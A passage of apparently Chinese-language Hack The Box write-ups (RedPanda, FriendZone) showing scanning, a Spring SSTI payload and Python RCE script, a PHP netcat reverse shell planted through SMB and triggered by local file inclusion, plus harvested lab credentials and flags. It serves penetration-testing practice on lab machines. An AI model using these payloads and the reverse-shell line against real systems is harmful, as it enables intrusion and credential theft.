0\\x20\\x20\\x20\\x20\\x20\\x20<span></span>\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x\nSF:20\\x20\\x20\\x20<span></span>\\n\\x20\\x20\\x20\\x20\\x20\\x20</div>\\n\\x20\\x20\\x\nSF:20\\x20\\x20\\x20<div\\x20class='whiskers\\x20right'>\\n\\x20\\x20\\x20\\x20\\x20\\\nSF:x20\\x20\\x20<span></span>\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20<span></span>\nSF:\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20<span></span>\\n\\x20\\x20\\x20\\x20\\x20\\x\nSF:20</div>\\n\\x20\\x20\\x20\\x20\\x20\\x20<div\\x20class='face'>\\n\\x20\\x20\\x20\\x\nSF:20\\x20\\x20\\x20\\x20<div\\x20class='eye\")%r(HTTPOptions,75,\"HTTP/1\\.1\\x202\nSF:00\\x20\\r\\nAllow:\\x20GET,HEAD,OPTIONS\\r\\nContent-Length:\\x200\\r\\nDate:\\x\nSF:20Sun,\\x2023\\x20Oct\\x202022\\x2001:16:01\\x20GMT\\r\\nConnection:\\x20close\\\nSF:r\\n\\r\\n\")%r(RTSPRequest,24E,\"HTTP/1\\.1\\x20400\\x20\\r\\nContent-Type:\\x20t\nSF:ext/html;charset=utf-8\\r\\nContent-Language:\\x20en\\r\\nContent-Length:\\x2\nSF:0435\\r\\nDate:\\x20Sun,\\x2023\\x20Oct\\x202022\\x2001:16:02\\x20GMT\\r\\nConnec\nSF:tion:\\x20close\\r\\n\\r\\n<!doctype\\x20html><html\\x20lang=\\\"en\\\"><head><tit\nSF:le>HTTP\\x20Status\\x20400\\x20\\xe2\\x80\\x93\\x20Bad\\x20Request</title><styl\nSF:e\\x20type=\\\"text/css\\\">body\\x20{font-family:Tahoma,Arial,sans-serif;}\\x\nSF:20h1,\\x20h2,\\x20h3,\\x20b\\x20{color:white;background-color:#525D76;}\\x20\nSF:h1\\x20{font-size:22px;}\\x20h2\\x20{font-size:16px;}\\x20h3\\x20{font-size:\nSF:14px;}\\x20p\\x20{font-size:12px;}\\x20a\\x20{color:black;}\\x20\\.line\\x20{h\nSF:eight:1px;background-color:#525D76;border:none;}</style></head><body><h\nSF:1>HTTP\\x20Status\\x20400\\x20\\xe2\\x80\\x93\\x20Bad\\x20Request</h1></body></\nSF:html>\");\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.92%E=4%D=10/23%OT=22%CT=1%CU=40350%PV=Y%DS=2%DC=T%G=Y%TM=635496\nOS:14%P=arm-apple-darwin21.5.0)SEQ(SP=103%GCD=1%ISR=106%TI=Z%CI=Z%II=I%TS=A\nOS:)OPS(O1=M539ST11NW7%O2=M539ST11NW7%O3=M539NNT11NW7%O4=M539ST11NW7%O5=M53\nOS:9ST11NW7%O6=M539ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88\nOS:)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M539NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+\nOS:%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)\nOS:T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A\nOS:=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%D\nOS:F=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=4\nOS:0%CD=S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 3306/tcp)\nHOP RTT       ADDRESS\n1   537.83 ms 10.10.14.1\n2   537.94 ms 10.10.11.170\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 93.28 seconds\n```\n## Http\n![](Hackthebox-RedPanda/a7ebd7aa-1c3b-4c70-b6c9-63ce5956683f.png)\n\n挺可爱一小熊猫，还会眨眼睛\n\n在下面有个搜索框，随便搜点东西看看\n\n![](Hackthebox-RedPanda/6f01e1b9-e0a8-4fc6-8c28-438269d664bb.png)\n\n看着交互界面，确实会去数据库进行交互查询，这种潜意识就觉得可能会有注入\n\n没测试出什么东西，去 fuzz 试试吧\n\n## Fuzz\n```bash\n lucifiel@MacBookPro  ~  ffuf -u 'http://10.10.11.170:8080/FUZZ' -w /Users/lucifiel/Documents/Penetration/SecLists/Discovery/Web-Content/raft-medium-directories.txt -t 200\n\n        /'___\\  /'___\\           /'___\\\n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/\n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\\n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/\n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\\n          \\/_/    \\/_/   \\/___/    \\/_/\n\n       v1.5.0-dev\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://10.10.11.170:8080/FUZZ\n :: Wordlist         : FUZZ: /Users/lucifiel/Documents/Penetration/SecLists/Discovery/Web-Content/raft-medium-directories.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 200\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500\n________________________________________________\n\nstats                   [Status: 200, Size: 987, Words: 200, Lines: 33, Duration: 619ms]\nerror                   [Status: 500, Size: 86, Words: 1, Lines: 1, Duration: 617ms]\nsearch                  [Status: 405, Size: 117, Words: 3, Lines: 1, Duration: 616ms]\n                        [Status: 200, Size: 1543, Words: 368, Lines: 56, Duration: 401ms]\n:: Progress: [30000/30000] :: Job [1/1] :: 8724 req/sec :: Duration: [0:00:41] :: Errors: 10271 ::\n```\n有一个 stats 目录，去看一下\n\n![](Hackthebox-RedPanda/2c7be7c5-fe4a-4b5d-881d-22eeb5ba5b62.png)\n\n![](Hackthebox-RedPanda/540af504-b13c-4b6a-a98b-d6a92002d03d.png)\n\n这边发现了一些图片，去尝试读取试试\n\n![](Hackthebox-RedPanda/44829a99-86a7-4024-aec1-c6e32b78076e.png)\n\n这里提示确实是有注入的，不过有一说一，这图片确实挺有意思的\n\n不过既然 sql 注入不行，那就试试 ssti 呗，反正可以确定漏洞在于注入了\n\n![](Hackthebox-RedPanda/fe9949f6-3343-42b1-9040-d1fbf4faefbb.png)\n\n测试出来了 语法是 \\*{7\\*7}，把 ssti 语句中的 \\$ 替换为 \\* 即可绕过\n\n# 漏洞利用\n我们通过 nmap 的扫描结果可得知，这个网站使用的是 Spring Boot，所以可以确定是一个 java 的程序\n\n所以我们去 ssti 的利用语句里找一下\n\n> [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#smarty](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#smarty)\n\n```bash\n*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}\n```\n```bash\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\nsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\nsystemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\nmessagebus:x:103:106::/nonexistent:/usr/sbin/nologin\nsyslog:x:104:110::/home/syslog:/usr/sbin/nologin\n_apt:x:105:65534::/nonexistent:/usr/sbin/nologin\ntss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false\nuuidd:x:107:112::/run/uuidd:/usr/sbin/nologin\ntcpdump:x:108:113::/nonexistent:/usr/sbin/nologin\nlandscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin\npollinate:x:110:1::/var/cache/pollinate:/bin/false\nsshd:x:111:65534::/run/sshd:/usr/sbin/nologin\nsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\nlxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false\nusbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin\nwoodenk:x:1000:1000:,,,:/home/woodenk:/bin/bash\nmysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false\n```\n成功读取到 /etc/passwd 文件\n\n虽然可以了，但是转换格式还是有点麻烦，所以我又找到了一篇文章\n\n> [https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/ssti-server-side-template-injection/el-expression-language.md](https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/ssti-server-side-template-injection/el-expression-language.md)\n\n```bash\n*{\"\".getClass().forName(\"java.lang.Runtime\").getRuntime().exec(\"whoami\")}\n```\n![](Hackthebox-RedPanda/67d0bdba-da91-4208-ab6f-879ed82d7b3f.png)\n\n直接执行似乎会提示错误，去开一个 http 服务试试\n\n```bash\npython3 -m http.server 80\n```\n然后改一下指令，来请求试试\n\n```bash\n*{\"\".getClass().forName(\"java.lang.Runtime\").getRuntime().exec(\"curl http://10.10.14.2\")}\n```\n```bash\n lucifiel@MacBookPro  ~  python3 -m http.server 80\nServing HTTP on :: port 80 (http://[::]:80/) ...\n::ffff:10.10.11.170 - - [23/Oct/2022 10:02:07] \"GET / HTTP/1.1\" 200 -\n```\n直接搞个 rce 脚本吧\n\n```python\n#!/usr/bin/python3\nimport requests\nfrom cmd import Cmd\nfrom bs4 import BeautifulSoup\n\n\nprint(\"\"\"\n __          __    __       ______     __      _______     __      _______     __      \n|  |        |  |  |  |     /      |   |  |    |   ____|   |  |    |   ____|   |  |     \n|  |        |  |  |  |    |  ,----'   |  |    |  |__      |  |    |  |__      |  |     \n|  |        |  |  |  |    |  |        |  |    |   __|     |  |    |   __|     |  |     \n|  `----.   |  `--'  |    |  `----.   |  |    |  |        |  |    |  |____    |  `----.\n|_______|    \\______/      \\______|   |__|    |__|        |__|    |_______|   |_______|\n\n\"\"\")\nclass RCE(Cmd):\n    prompt = \"\\033[1;31m$\\033[1;37m \"\n    def decimal(self, args):\n        comando = args\n        decimales = []\n\n        for i in comando:\n            decimales.append(str(ord(i)))\n        payload = \"*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)\" % decimales[0]\n\n        for i in decimales[1:]:\n            payload += \".concat(T(java.lang.Character).toString({}))\".format(i)\n\n        payload += \").getInputStream())}\"\n        data = { \"name\": payload }\n        requer = requests.post(\"http://10.10.11.170:8080/search\", data=data)\n        parser = BeautifulSoup(requer.content, 'html.parser')\n        grepcm = parser.find_all(\"h2\")[0].get_text()\n        result = grepcm.replace('You searched for:','').strip()\n        print(result)\n\n    def default(self, args):\n        try:\n            self.decimal(args)\n        except:\n            print(\"%s: command not found\" % (args))\n\nRCE().cmdloop()\n```\n```bash\n lucifiel@MacBookPro  ~/Desktop  python3 exploip.py\n\n __          __    __       ______     __      _______     __      _______     __\n|  |        |  |  |  |     /      |   |  |    |   ____|   |  |    |   ____|   |  |\n|  |        |  |  |  |    |  ,----'   |  |    |  |__      |  |    |  |__      |  |\n|  |        |  |  |  |    |  |        |  |    |   __|     |  |    |   __|     |  |\n|  `----.   |  `--'  |    |  `----.   |  |    |  |        |  |    |  |____    |  `----.\n|_______|    \\______/      \\______|   |__|    |__|        |__|    |_______|   |_______|\n\n\n$ whoami\nwoodenk\n$ id\nuid=1000(woodenk) gid=1001(logs) groups=1001(logs),1000(woodenk)\n```\n可以成功执行，但是还是没有 shell 方便，先去看看有没有什么可以拿到 shell 的东西吧\n\n在文件 `/opt/panda_search/src/main/java/com/panda_search/htb/panda_search/MainController.java` 中，找到了一段凭证\n\n```bash\nconn = DriverManager.getConnection(\"jdbc:mysql://localhost:3306/red_panda\", \"woodenk\", \"RedPandazRule\");\n```\n```bash\nusername = woodenk\npassword = RedPandazRule\n```\n```bash\n lucifiel@MacBookPro  ~/Desktop  ssh woodenk@10.10.11.170\nwoodenk@10.10.11.170's password:\nWelcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-121-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n  System information as of Mon 24 Oct 2022 03:15:10 AM UTC\n\n  System load:           0.02\n  Usage of /:            80.9% of 4.30GB\n  Memory usage:          41%\n  Swap usage:            0%\n  Processes:             213\n  Users logged in:       0\n  IPv4 address for eth0: 10.10.11.170\n  IPv6 address for eth0: dead:beef::250:56ff:feb9:1c2\n\n\n0 updates can be applied immediately.\n\n\nThe list of available updates is more than a week old.\nTo check for new updates run: sudo apt update\nFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings\n\n\nLast login: Mon Oct 24 03:14:58 2022 from 10.10.14.11\nwoodenk@redpanda:~$ whoami&&id\nwoodenk\nuid=1000(woodenk) gid=1000(woodenk) groups=1000(woodenk)\n```\n成功拿到 user 权限的 shell\n\n```bash\nwoodenk@redpanda:~$ cat user.txt\na00d4342cd040f667d3dbfee34a49451\n```\n成功拿到 user 权限的 flag 文件\n","tags":["Hackthebox"]},{"title":"FriendZone - Hackthebox","url":"/2022/09/20/Hackthebox/Easy/Hackthebox-FriendZone/","content":"\n# Hackthebox - FriendZone\n# 靶场信息\n![](Hackthebox-FriendZone/1685a985-17e0-44e9-bd04-a66535d31e57.png)\n\n# 靶场类型\n![](Hackthebox-FriendZone/b0a91def-39ba-4606-a732-8ed9239ee972.png)\n\n# 信息收集\n## Nmap\n```bash\n┌──(root㉿lucifiel)-[~/Desktop]\n└─# nmap -sS -sC -sV -A -p- --min-rate 5000 10.10.10.123\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-09-09 13:14 CST\nNmap scan report for 10.10.10.123\nHost is up (0.27s latency).\nNot shown: 65528 closed tcp ports (reset)\nPORT    STATE SERVICE     VERSION\n21/tcp  open  ftp         vsftpd 3.0.3\n22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 (RSA)\n|   256 e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e (ECDSA)\n|_  256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b (ED25519)\n53/tcp  open  domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)\n| dns-nsid: \n|_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu\n80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: Friend Zone Escape software\n139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\n443/tcp open  ssl/http    Apache httpd 2.4.29\n| tls-alpn: \n|_  http/1.1\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_ssl-date: TLS randomness does not represent time\n| ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO\n| Not valid before: 2018-10-05T21:02:30\n|_Not valid after:  2018-11-04T21:02:30\n|_http-title: 404 Not Found\n445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.92%E=4%D=9/9%OT=21%CT=1%CU=36793%PV=Y%DS=2%DC=T%G=Y%TM=631ACC10\nOS:%P=aarch64-unknown-linux-gnu)SEQ(SP=101%GCD=1%ISR=107%TI=Z%CI=I%II=I%TS=\nOS:A)OPS(O1=M539ST11NW7%O2=M539ST11NW7%O3=M539NNT11NW7%O4=M539ST11NW7%O5=M5\nOS:39ST11NW7%O6=M539ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=712\nOS:0)ECN(R=Y%DF=Y%T=40%W=7210%O=M539NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S\nOS:+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=\nOS:)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%\nOS:A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%\nOS:DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=\nOS:40%CD=S)\n\nNetwork Distance: 2 hops\nService Info: Hosts: FRIENDZONE, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n\nHost script results:\n|_clock-skew: mean: -1h00m00s, deviation: 1h43m54s, median: -1s\n| smb-security-mode: \n|   account_used: guest\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n|_nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)\n| smb-os-discovery: \n|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)\n|   Computer name: friendzone\n|   NetBIOS computer name: FRIENDZONE\\x00\n|   Domain name: \\x00\n|   FQDN: friendzone\n|_  System time: 2022-09-09T08:15:47+03:00\n| smb2-time: \n|   date: 2022-09-09T05:15:49\n|_  start_date: N/A\n| smb2-security-mode: \n|   3.1.1: \n|_    Message signing enabled but not required\n\nTRACEROUTE (using port 3306/tcp)\nHOP RTT       ADDRESS\n1   277.35 ms 10.10.14.1\n2   277.61 ms 10.10.10.123\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 60.57 seconds\n```\n## Http\n![](Hackthebox-FriendZone/9a965834-fcb3-4978-962c-2f4e60dbed20.png)\n\n就一张静态图片，肯定不在这里了\n\n## Ftp\n```bash\n┌──(root㉿lucifiel)-[~/Desktop]\n└─# ftp 10.10.10.123\nConnected to 10.10.10.123.\n220 (vsFTPd 3.0.3)\nName (10.10.10.123:root): anonymous\n331 Please specify the password.\nPassword: \n530 Login incorrect.\nftp: Login failed\n```\n本台不允许 ftp 匿名登陆\n\n```bash\n┌──(root㉿lucifiel)-[~/Desktop]\n└─# searchsploit vsftpd 3.0.3\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\n Exploit Title                                                                                                                                                                                            |  Path\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nvsftpd 3.0.3 - Remote Denial of Service                                                                                                                                                                   | multiple/remote/49719.py\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nShellcodes: No Results\n```\nExploit-DB 也只找到一个远程DDOS的漏洞，没什么实际意义\n\n## Samba\n```bash\n┌──(root㉿lucifiel)-[~/Desktop]\n└─# smbmap -H 10.10.10.123\n[+] Guest session       IP: 10.10.10.123:445    Name: 10.10.10.123                                      \n        Disk                                                    Permissions     Comment\n        ----                                                    -----------     -------\n        print$                                                  NO ACCESS       Printer Drivers\n        Files                                                   NO ACCESS       FriendZone Samba Server Files /etc/Files\n        general                                                 READ ONLY       FriendZone Samba Server Files\n        Development                                             READ, WRITE     FriendZone Samba Server Files\n        IPC$                                                    NO ACCESS       IPC Service (FriendZone server (Samba, Ubuntu))\n```\n```bash\n┌──(root㉿lucifiel)-[~/Desktop]\n└─# smbclient --list 10.10.10.123 -U \"\"  \nPassword for [WORKGROUP\\]:\n\n        Sharename       Type      Comment\n        ---------       ----      -------\n        print$          Disk      Printer Drivers\n        Files           Disk      FriendZone Samba Server Files /etc/Files\n        general         Disk      FriendZone Samba Server Files\n        Development     Disk      FriendZone Samba Server Files\n        IPC$            IPC       IPC Service (FriendZone server (Samba, Ubuntu))\nReconnecting with SMB1 for workgroup listing.\n\n        Server               Comment\n        ---------            -------\n\n        Workgroup            Master\n        ---------            -------\n        WORKGROUP            FRIENDZONE\n```\n```bash\n┌──(root㉿lucifiel)-[~/Desktop]\n└─# nmap -p 445 --script=smb-enum-shares 10.10.10.123\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-09-20 09:50 CST\nNmap scan report for 10.10.10.123\nHost is up (1.2s latency).\n\nPORT    STATE SERVICE\n445/tcp open  microsoft-ds\n\nHost script results:\n| smb-enum-shares: \n|   account_used: guest\n|   \\\\10.10.10.123\\Development: \n|     Type: STYPE_DISKTREE\n|     Comment: FriendZone Samba Server Files\n|     Users: 0\n|     Max Users: <unlimited>\n|     Path: C:\\etc\\Development\n|     Anonymous access: READ/WRITE\n|     Current user access: READ/WRITE\n|   \\\\10.10.10.123\\Files: \n|     Type: STYPE_DISKTREE\n|     Comment: FriendZone Samba Server Files /etc/Files\n|     Users: 0\n|     Max Users: <unlimited>\n|     Path: C:\\etc\\hole\n|     Anonymous access: <none>\n|     Current user access: <none>\n|   \\\\10.10.10.123\\IPC$: \n|     Type: STYPE_IPC_HIDDEN\n|     Comment: IPC Service (FriendZone server (Samba, Ubuntu))\n|     Users: 1\n|     Max Users: <unlimited>\n|     Path: C:\\tmp\n|     Anonymous access: READ/WRITE\n|     Current user access: READ/WRITE\n|   \\\\10.10.10.123\\general: \n|     Type: STYPE_DISKTREE\n|     Comment: FriendZone Samba Server Files\n|     Users: 0\n|     Max Users: <unlimited>\n|     Path: C:\\etc\\general\n|     Anonymous access: READ/WRITE\n|     Current user access: READ/WRITE\n|   \\\\10.10.10.123\\print$: \n|     Type: STYPE_DISKTREE\n|     Comment: Printer Drivers\n|     Users: 0\n|     Max Users: <unlimited>\n|     Path: C:\\var\\lib\\samba\\printers\n|     Anonymous access: <none>\n|_    Current user access: <none>\n\nNmap done: 1 IP address (1 host up) scanned in 95.19 seconds\n```\n```bash\n┌──(root㉿lucifiel)-[~/Desktop]\n└─# smbclient -N \\\\\\\\10.10.10.123\\\\Development\nTry \"help\" to get a list of possible commands.\nsmb: \\> ls\n  .                                   D        0  Tue Sep 20 09:51:26 2022\n  ..                                  D        0  Tue Sep 13 22:56:24 2022\n\n                3545824 blocks of size 1024. 1658488 blocks available\n```\n四大常用指令挨个执行一遍，拿到的信息越多越好\n\nDevelopment 文件夹是空的，看看另一个有读取权限的文件夹\n\n```bash\n┌──(root㉿lucifiel)-[~/Desktop]\n└─# smbclient -N \\\\\\\\10.10.10.123\\\\general\nTry \"help\" to get a list of possible commands.\nsmb: \\> ls\n  .                                   D        0  Thu Jan 17 04:10:51 2019\n  ..                                  D        0  Tue Sep 13 22:56:24 2022\n  creds.txt                           N       57  Wed Oct 10 07:52:42 2018\n\n                3545824 blocks of size 1024. 1658484 blocks available\n```\n这边有一个 creds.txt 文件，读取看一下\n\n```bash\ncreds for the admin THING:\n\nadmin:WORKWORKHhallelujah@#\n```\n似乎是一个账号密码\n\n# 漏洞利用\n我们回到 Http 页面，会看到有一个邮箱 info@friendzoneportal.red\n\n既然是域名邮箱，那按照常理来说是会存在这个域名的\n\n![](Hackthebox-FriendZone/33882849-1ab7-46b1-8438-122572d089ce.png)\n\n查看了一下证书，发现确实存在域名，但是是 friendzone.red，去添加一个 hosts 解析\n\n```bash\necho 10.10.10.123 friendzone.red >> /etc/hosts\n```\n```bash\n┌──(root㉿lucifiel)-[~/Desktop]\n└─# dig axfr friendzone.red @10.10.10.123\n\n; <<>> DiG 9.18.1-1-Debian <<>> axfr friendzone.red @10.10.10.123\n;; global options: +cmd\nfriendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800\nfriendzone.red.         604800  IN      AAAA    ::1\nfriendzone.red.         604800  IN      NS      localhost.\nfriendzone.red.         604800  IN      A       127.0.0.1\nadministrator1.friendzone.red. 604800 IN A      127.0.0.1\nhr.friendzone.red.      604800  IN      A       127.0.0.1\nuploads.friendzone.red. 604800  IN      A       127.0.0.1\nfriendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800\n;; Query time: 1439 msec\n;; SERVER: 10.10.10.123#53(10.10.10.123) (TCP)\n;; WHEN: Tue Sep 20 10:09:07 CST 2022\n;; XFR size: 8 records (messages 1, bytes 289)\n```\n枚举域名信息，发现了三个子域名\n\n```bash\nadministrator1.friendzone.red hr.friendzone.red uploads.friendzone.red\n```\n都添加到 hosts\n\n[https://administrator1.friendzone.red/](https://administrator1.friendzone.red/) 访问后发现是一个登陆页面\n\n![](Hackthebox-FriendZone/dfc2d5f6-36c9-457e-9a31-3873c5e44667.png)\n\n使用我们的账号密码进行登录\n\n![](Hackthebox-FriendZone/fa0b0178-107c-47af-8f93-38c738a1892d.png)\n\n登陆成功，让我们访问 /dashboard.php\n\n![](Hackthebox-FriendZone/212b0b2e-9469-4660-a090-c08b0dae4a17.png)\n\n大概意思是说，这是一个用于朋友圈的智能照片脚本，但是这是一个初级的 php 开发人员写的代码，然后这个脚本还没经过测试，所以有一个参数被遗忘了，输入这个参数可以现实图片，默认是 image\\_id=a.jpg&pagename=timestamp\n\n![](Hackthebox-FriendZone/6a033764-ad5a-41e1-94a6-dfaad1d72b43.png)\n\n看到这参数构成，感觉存在 LFI（本地文件包含），然后在之前的 Development 处，感觉有点不对，一个可读写的地址却没有内容，应该是给我们上传的点。然后我们也知道它的绝对路径，去尝试上传到 Development，再去 LFI 读取试试\n\n```bash\n\\\\10.10.10.123\\Development: \n|     Type: STYPE_DISKTREE\n|     Comment: FriendZone Samba Server Files\n|     Users: 0\n|     Max Users: <unlimited>\n|     Path: C:\\etc\\Development\n|     Anonymous access: READ/WRITE\n|     Current user access: READ/WRITE\n```\n```bash\n<?php\nsystem('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 4444 >/tmp/f');\n?>\n```\n把 shell 写入到 php 文件，然后去上传\n\n```bash\n┌──(root㉿lucifiel)-[~/Desktop]\n└─# smbclient //10.10.10.123/development -U \"\"\nPassword for [WORKGROUP\\]:\nTry \"help\" to get a list of possible commands.\nsmb: \\> put shell.php \nputting file shell.php as \\shell.php (0.1 kb/s) (average 0.1 kb/s)\n```\n然后去包含试试\n\n```bash\nnc -nvlp 4444\n```\n```bash\nhttps://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=/etc/Development/shell\n```\n```bash\n┌──(root㉿lucifiel)-[~/Desktop]\n└─# nc -nvlp 4444                                    \nlistening on [any] 4444 ...\nconnect to [10.10.14.3] from (UNKNOWN) [10.10.10.123] 39570\n/bin/sh: 0: can't access tty; job control turned off\n$ python3 -c \"import pty;pty.spawn('/bin/bash')\";\nwww-data@FriendZone:/var/www/admin$ whoami&&id\nwhoami&&id\nwww-data\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n```\n成功获得 shel\n\n```bash\nwww-data@FriendZone:/home/friend$ cat user.txt\ncat user.txt\na4977797fce2cc139c86af2adc340a29\n```\n成功拿到 user 权限的 flag 文件\n\n# 权限提升\n## User\n```bash\nwww-data@FriendZone:/var/www$ ls\nls\nadmin       friendzoneportal       html             uploads\nfriendzone  friendzoneportaladmin  mysql_data.conf\nwww-data@FriendZone:/var/www$ cat mysql_data.conf\ncat mysql_data.conf\nfor development process this is the mysql creds for user friend\n\ndb_user=friend\n\ndb_pass=Agpyu12!0.213$\n\ndb_name=FZ\n```\n在登入后的目录找到了一个 mysql\\_data.conf 文件，里面包含了一些凭证\n\n```bash\nww-data@FriendZone:/var/www$ cat /etc/passwd|grep bash\ncat 